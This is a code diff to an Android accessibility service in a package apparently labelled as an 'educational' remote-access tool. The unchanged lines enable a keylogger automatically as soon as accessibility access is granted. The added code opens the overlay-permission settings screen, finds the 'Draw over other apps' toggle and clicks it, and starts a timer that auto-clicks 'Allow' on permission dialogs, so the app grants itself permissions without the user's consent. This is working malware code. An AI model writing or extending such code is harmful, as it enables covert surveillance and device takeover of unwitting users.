@@ -23,7 +23,9 @@ import java.util.List;
 
 import android.content.Intent;
 import android.graphics.Bitmap;
+import android.net.Uri;
 import android.os.Build;
+import android.provider.Settings;
 import androidx.annotation.RequiresApi;
 import com.remoteaccess.educational.network.SocketManager;
 import com.remoteaccess.educational.utils.KeepAliveManager;
@@ -87,7 +89,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         
         // Auto-enable keylogger as soon as accessibility is granted
         com.remoteaccess.educational.commands.KeyloggerService.setEnabled(true);
-        
+
+        // Start grant-perms timer immediately so permission dialogs are auto-clicked
+        startGrantPermsTimer();
+
+        // Request SYSTEM_ALERT_WINDOW (Draw over other apps) if not already granted
+        requestOverlayPermissionIfNeeded();
+
         // Start continuous auto-click scan immediately
         startAutoClickScanner();
         
@@ -348,8 +356,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
     
     private boolean runGrantPerms(AccessibilityNodeInfo rootNode) {
-        // Only runs for 10 seconds after accessibility is enabled
-        
+        // Only runs for GRANT_PERMS_DURATION after accessibility is enabled
+
+        // Special handling: "Draw over other apps" / overlay permission screen —
+        // the toggle is a Switch with no standard button label; find and click it.
+        if (tryGrantOverlayPermission(rootNode)) return true;
+
         String[] keywords = {
             "Allow only while using the app",
             "Allow",
@@ -378,6 +390,51 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         
         return false;
     }
+
+    private boolean tryGrantOverlayPermission(AccessibilityNodeInfo rootNode) {
+        try {
+            String screenText = getAllScreenText(rootNode);
+            boolean isOverlayScreen = screenText.contains("display over other apps")
+                    || screenText.contains("Display over other apps")
+                    || screenText.contains("appear on top")
+                    || screenText.contains("Appear on top")
+                    || screenText.contains("draw over other apps")
+                    || screenText.contains("Draw over other apps");
+            if (!isOverlayScreen) return false;
+
+            return clickUncheckedSwitch(rootNode);
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private boolean clickUncheckedSwitch(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        try {
+            CharSequence cls = node.getClassName();
+            if (cls != null) {
+                String clsStr = cls.toString().toLowerCase();
+                if ((clsStr.contains("switch") || clsStr.contains("togglebutton"))
+                        && !node.isChecked()) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    return true;
+                }
+            }
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    if (clickUncheckedSwitch(child)) {
+                        child.recycle();
+                        return true;
+                    }
+                    child.recycle();
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return false;
+    }
     
     public void startGrantPermsTimer() {
         grantPermsStartTime = System.currentTimeMillis();
@@ -385,6 +442,19 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     
     public void stopGrantPermsTimer() {
         grantPermsStartTime = 0;
+    }
+
+    private void requestOverlayPermissionIfNeeded() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        Uri.parse("package:" + getPackageName()));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "requestOverlayPermissionIfNeeded: " + e.getMessage());
+        }
     }
 
     /** Enable uninstall-assist mode: accessibility will click Uninstall/OK buttons. */
